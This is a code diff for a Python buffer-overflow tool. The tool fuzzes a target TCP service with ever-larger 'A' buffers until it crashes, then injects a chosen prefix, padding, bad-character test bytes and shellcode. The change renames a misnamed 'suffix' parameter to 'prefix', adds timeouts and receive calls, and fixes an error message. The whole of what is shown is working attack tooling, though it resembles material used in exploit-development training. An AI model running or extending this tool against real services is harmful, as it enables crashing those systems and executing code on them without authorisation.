@@ -78,11 +78,13 @@ def test_connection(target_ip, target_port):
     k.close()
 
 
-def spike_fuzz_mode(target_ip, target_port, mode, suffix, prefill, step):
+def spike_fuzz_mode(target_ip, target_port, mode, prefix, prefill, step):
     # spike and fuzz modes
 
     # standard step size for fuzz
     package = b'A'*step
+    timeout = 5
+
 
     if mode == 'spike':
         mult = 1000
@@ -90,40 +92,46 @@ def spike_fuzz_mode(target_ip, target_port, mode, suffix, prefill, step):
         mult = 1
 
     # the smaller the step, the higher is accuracy
-    buffer = suffix + prefill
+    buffer = prefix + prefill
 
     while (True and (mode != "inject")):
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((target_ip, target_port))
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                
+                s.settimeout(timeout)
+                s.connect((target_ip, target_port))
+                s.recv(1024)
 
-            # send information as bytes
-            s.sendall(buffer)
-            s.close()
+                # send information as bytes
+                s.sendall(buffer)
+                s.recv(1024)
+                s.close()
 
-            sleep(1)
-            buffer = buffer + package * mult
-            print("Server alive. Total payload size = %d" % len(buffer))
+                sleep(1)
+                buffer = buffer + package * mult
+                print("Server alive. Payload size = %d" % (len(buffer) - len(prefix)))
 
         except KeyboardInterrupt:
             print("Operation aborted. Exiting...")
             sys.exit()
 
         except:
-            print("Overflow at  %d bytes including suffix of %d bytes." %
-                  len(buffer), len(suffix))
+            print("Overflow at around %d bytes." %(len(buffer) - len(prefix)))
             sys.exit(1)
 
 
-def inject_mode(target_ip, target_port, BadChars, suffix, prefill, shellcode, useBadChars):
+def inject_mode(target_ip, target_port, BadChars, prefix, prefill, shellcode, useBadChars):
+
+    timeout = 5
 
     if not useBadChars:
         BadChars = bytearray("", encoding='ascii')
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(timeout)
     s.connect((target_ip, target_port))
 
-    s.sendall(suffix + prefill + BadChars + shellcode + b"\n")
+    s.sendall(prefix + prefill + BadChars + shellcode + b"\n")
 
     print(f"Injected into {target_ip}:{target_port}")
 
@@ -147,10 +155,10 @@ def main():
                         help='port number of the target host')
     parser.add_argument('-s', '--step', default=100, type=int,
                         help='Step is amount of bytes to use in Fuzzying mode')
-    parser.add_argument('-x', '--suffix', default='', type=str,
-                        help='Suffix can be used at the beginning of each TCP frame to make correct requests')
+    parser.add_argument('-x', '--prefix', default='', type=str,
+                        help='prefix can be used at the beginning of each TCP frame to make correct requests')
     parser.add_argument('-n', '--prefill_num', default=0, type=int,
-                        help='Prefill the payload with n bytes after suffix')
+                        help='Prefill the payload with n bytes after prefix')
     parser.add_argument('-a', '--prefill_hex', default='', type=str,
                         help='Prefill the payload with specific hex symbols')
     parser.add_argument('-b', '--useBadChars', default=0, type=int,
@@ -167,7 +175,7 @@ def main():
     target_ip = args.targetIP
     target_port = args.targetPort
     step = args.step
-    suffix = bytearray(args.suffix, encoding='ascii')
+    prefix = bytearray(args.prefix, encoding='ascii')
     prefill_num = args.prefill_num
     prefill_hex = bytearray(args.prefill_hex, encoding='ascii')
     useBadChars = args.useBadChars
@@ -178,13 +186,13 @@ def main():
     if mode == "spike" or mode == "fuzz":
 
         test_connection(target_ip, target_port)
-        spike_fuzz_mode(target_ip, target_port, mode, suffix, prefill, step)
+        spike_fuzz_mode(target_ip, target_port, mode, prefix, prefill, step)
 
     elif mode == "inject":
 
         test_connection(target_ip, target_port)
         inject_mode(target_ip, target_port, BadChars,
-                    suffix, prefill, shellcode, useBadChars)
+                    prefix, prefill, shellcode, useBadChars)
 
     else:
         print(f"Uknown mode: {mode} ... exiting")
